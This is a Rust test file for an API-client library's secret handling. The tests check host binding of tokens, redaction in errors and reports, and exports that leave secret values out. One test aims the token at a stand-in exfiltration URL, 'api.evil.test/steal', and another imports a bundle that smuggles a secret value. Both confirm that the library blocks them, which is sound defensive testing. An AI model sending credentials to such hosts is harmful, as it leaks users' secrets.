use mandalo_core::capability::MemorySecrets;
use mandalo_core::collection::{self, SavedRequest};
use mandalo_core::request::Auth;
use mandalo_core::runner::{Runner, VarFrame};
use mandalo_core::workspace::{self, EnvDoc, VarDef};
use mandalo_core::{bundle, redact, AllowAll, CoreError, Redactor, SecretWriter};
use mandalo_testkit::fixtures;
use mandalo_testkit::MockApi;
use std::path::Path;

const SECRET: &str = "ghp_16C7e42F292c6912E7710c838347Ae178B4a";

fn workspace_with_secret(dir: &Path, hosts: &[&str], store: &MemorySecrets) -> String {
    let slug = fixtures::workspace(dir);
    let mut doc = EnvDoc::new("prod");
    doc.vars.insert("token".to_string(), VarDef::secret(hosts));
    workspace::save_env_doc(dir, &doc).unwrap();
    store.set("prod", "token", SECRET).unwrap();
    slug
}

fn request_to(url: &str) -> SavedRequest {
    let mut request = fixtures::request("Whoami", "GET", url);
    request.auth = Auth::Bearer {
        token: "{{token}}".to_string(),
    };
    request
}

fn frame(dir: &Path) -> VarFrame {
    VarFrame::from_doc(&workspace::read_env_doc(dir, "prod").unwrap().unwrap())
}

#[tokio::test]
async fn a_secret_bound_to_the_host_it_is_sent_to_goes_through() {
    let dir = tempfile::tempdir().unwrap();
    let mock = MockApi::start().await;
    let store = MemorySecrets::new();
    workspace_with_secret(dir.path(), &["127.0.0.1"], &store);

    let runner = Runner::new(store, AllowAll);
    let mut vars = frame(dir.path());
    let step = runner
        .run_request(&request_to(&mock.url("/headers/echo")), &mut vars)
        .await
        .unwrap();

    assert!(step.error.is_none(), "{:?}", step.error);
    assert!(step.unbound_secrets.is_empty());
    let sent = mock.last_request().unwrap();
    assert_eq!(
        sent.header("authorization"),
        Some(format!("Bearer {SECRET}").as_str())
    );
}

#[tokio::test]
async fn a_secret_bound_elsewhere_is_never_sent() {
    let dir = tempfile::tempdir().unwrap();
    let mock = MockApi::start().await;
    let store = MemorySecrets::new();
    workspace_with_secret(dir.path(), &["api.acme.com"], &store);

    let runner = Runner::new(store, AllowAll);
    let mut vars = frame(dir.path());
    let error = runner
        .run_request(&request_to(&mock.url("/headers/echo")), &mut vars)
        .await
        .unwrap_err();

    assert_eq!(error.code(), "E_SECRET_HOST_DENIED");
    let text = error.to_string();
    assert!(text.contains("prod.token"), "{text}");
    assert!(text.contains("api.acme.com"), "{text}");
    assert!(text.contains("127.0.0.1"), "{text}");
    assert!(
        !text.contains(SECRET),
        "the denial must not quote the secret"
    );
    assert!(
        mock.last_request().is_none(),
        "the request must never leave the machine"
    );
}

#[tokio::test]
async fn an_unbound_secret_is_allowed_and_the_host_is_reported_back() {
    let dir = tempfile::tempdir().unwrap();
    let mock = MockApi::start().await;
    let store = MemorySecrets::new();
    workspace_with_secret(dir.path(), &[], &store);

    let runner = Runner::new(store, AllowAll);
    let mut vars = frame(dir.path());
    let step = runner
        .run_request(&request_to(&mock.url("/headers/echo")), &mut vars)
        .await
        .unwrap();

    assert_eq!(step.unbound_secrets.len(), 1);
    assert_eq!(step.unbound_secrets[0].name, "token");
    assert_eq!(step.unbound_secrets[0].env, "prod");
    assert_eq!(step.unbound_secrets[0].host, "127.0.0.1");

    let bound = workspace::bind_secret_host(
        dir.path(),
        "prod",
        "token",
        &step.unbound_secrets[0].host.clone(),
    )
    .unwrap();
    assert_eq!(bound, vec!["127.0.0.1".to_string()]);
}

#[tokio::test]
async fn the_host_binding_still_holds_on_the_second_request_of_a_run() {
    let dir = tempfile::tempdir().unwrap();
    let mock = MockApi::start().await;
    let store = MemorySecrets::new();
    workspace_with_secret(dir.path(), &["127.0.0.1"], &store);

    let runner = Runner::new(store, AllowAll);
    let mut vars = frame(dir.path());
    runner
        .run_request(&request_to(&mock.url("/headers/echo")), &mut vars)
        .await
        .unwrap();

    // The value now sits in the frame; the binding must still be enforced.
    let error = runner
        .run_request(&request_to("https://api.evil.test/steal"), &mut vars)
        .await
        .unwrap_err();
    assert_eq!(error.code(), "E_SECRET_HOST_DENIED");
    assert!(error.to_string().contains("api.evil.test"));
}

#[tokio::test]
async fn a_missing_secret_fails_loud_instead_of_sending_an_empty_value() {
    let dir = tempfile::tempdir().unwrap();
    let mock = MockApi::start().await;
    let store = MemorySecrets::new();
    fixtures::workspace(dir.path());
    let mut doc = EnvDoc::new("prod");
    doc.vars
        .insert("token".to_string(), VarDef::secret(&["127.0.0.1"]));
    workspace::save_env_doc(dir.path(), &doc).unwrap();

    let runner = Runner::new(store, AllowAll);
    let mut vars = frame(dir.path());
    let error = runner
        .run_request(&request_to(&mock.url("/headers/echo")), &mut vars)
        .await
        .unwrap_err();

    assert_eq!(error.code(), "E_SECRET");
    assert!(error.to_string().contains("prod.token"));
    assert!(error.to_string().contains("no value on this machine"));
    assert!(mock.last_request().is_none());
}

#[tokio::test]
async fn a_secret_echoed_back_in_a_response_body_is_redacted_in_diagnostics() {
    let dir = tempfile::tempdir().unwrap();
    let mock = MockApi::start().await;
    let store = MemorySecrets::new();
    workspace_with_secret(dir.path(), &["127.0.0.1"], &store);

    let runner = Runner::new(store, AllowAll);
    let mut vars = frame(dir.path());
    let step = runner
        .run_request(&request_to(&mock.url("/headers/echo")), &mut vars)
        .await
        .unwrap();

    let body = step.response.expect("a response").body;
    assert!(
        body.contains(SECRET),
        "the mock echoes the header, so the raw body does carry it"
    );
    assert!(!redact::scrub(&body).contains(SECRET));
    assert!(redact::scrub(&body).contains("[redacted:prod.token]"));
}

#[test]
fn no_error_variant_can_carry_a_secret_out_through_display() {
    let fixture = "s3cr3t-fixture-fd8c31a7b9";
    redact::register("prod", "token", fixture);
    let variants = CoreError::all_variants(&format!("while sending: {fixture} was rejected"));
    assert_eq!(
        variants.len(),
        22,
        "every CoreError variant must be listed in all_variants"
    );
    for error in variants {
        let shown = error.to_string();
        assert!(
            !shown.contains(fixture),
            "{} leaked the secret: {shown}",
            error.code()
        );
        assert!(shown.contains("[redacted:prod.token]"), "{shown}");
    }
}

#[test]
fn the_redactor_covers_a_secret_split_across_a_report() {
    let r = Redactor::new(false);
    r.register("prod", "token", SECRET);
    let report = format!("request failed\nAuthorization: Bearer {SECRET}\nbody: {{}}");
    assert!(!r.scrub(&report).contains(SECRET));
}

#[test]
fn an_export_carries_declarations_and_never_a_secret_value() {
    let dir = tempfile::tempdir().unwrap();
    let store = MemorySecrets::new();
    let slug = workspace_with_secret(dir.path(), &["api.acme.com"], &store);
    collection::save_request(
        dir.path(),
        &slug,
        None,
        None,
        &request_to("https://api.acme.com/me"),
    )
    .unwrap();

    let exported = bundle::export(dir.path()).unwrap();
    assert!(!exported.json.contains(SECRET), "{}", exported.json);
    let parsed: serde_json::Value = serde_json::from_str(&exported.json).unwrap();
    let token = &parsed["environments"][0]["vars"]["token"];
    assert_eq!(token["secret"], true);
    assert_eq!(token["hosts"][0], "api.acme.com");
    assert!(token["value"].is_null());
    assert!(exported.findings.is_empty(), "{:?}", exported.findings);
}

#[test]
fn an_export_surfaces_a_credential_that_a_user_typed_into_a_plain_variable() {
    let dir = tempfile::tempdir().unwrap();
    fixtures::workspace(dir.path());
    fixtures::environment(dir.path(), "prod", &[("token", SECRET)]);

    let exported = bundle::export(dir.path()).unwrap();
    assert_eq!(exported.findings.len(), 1);
    assert_eq!(exported.findings[0].rule, "github-token");
    assert!(
        !exported.findings[0].excerpt.contains(SECRET),
        "a finding quotes a prefix, never the credential"
    );
}

#[test]
fn a_bundle_round_trip_keeps_the_declaration_and_the_binding() {
    let a = tempfile::tempdir().unwrap();
    let b = tempfile::tempdir().unwrap();
    let store = MemorySecrets::new();
    workspace_with_secret(a.path(), &["api.acme.com"], &store);
    fixtures::workspace(b.path());

    let exported = bundle::export(a.path()).unwrap();
    bundle::import(b.path(), &exported.json).unwrap();

    let doc = workspace::read_env_doc(b.path(), "prod").unwrap().unwrap();
    assert_eq!(
        doc.vars["token"],
        VarDef::Secret {
            hosts: vec!["api.acme.com".to_string()]
        }
    );
}

#[test]
fn a_bundle_that_smuggles_a_value_into_a_secret_is_rejected() {
    let dir = tempfile::tempdir().unwrap();
    fixtures::workspace(dir.path());
    let json = serde_json::json!({
        "mandaloBundle": 2,
        "collections": [],
        "environments": [{
            "name": "prod",
            "vars": {"token": {"secret": true, "value": SECRET, "hosts": ["api.acme.com"]}}
        }]
    })
    .to_string();

    let error = bundle::import(dir.path(), &json).unwrap_err();
    assert_eq!(error.code(), "E_SCHEMA");
    assert!(workspace::read_env_doc(dir.path(), "prod")
        .unwrap()
        .is_none());
}

#[test]
fn a_legacy_bundle_with_flat_environment_vars_still_imports() {
    let dir = tempfile::tempdir().unwrap();
    fixtures::workspace(dir.path());
    let json = serde_json::json!({
        "mandaloBundle": 2,
        "collections": [],
        "environments": [{"name": "prod", "vars": {"base": "https://x.dev"}}]
    })
    .to_string();

    bundle::import(dir.path(), &json).unwrap();
    let doc = workspace::read_env_doc(dir.path(), "prod")
        .unwrap()
        .unwrap();
    assert_eq!(doc.vars["base"], VarDef::plain("https://x.dev"));
}
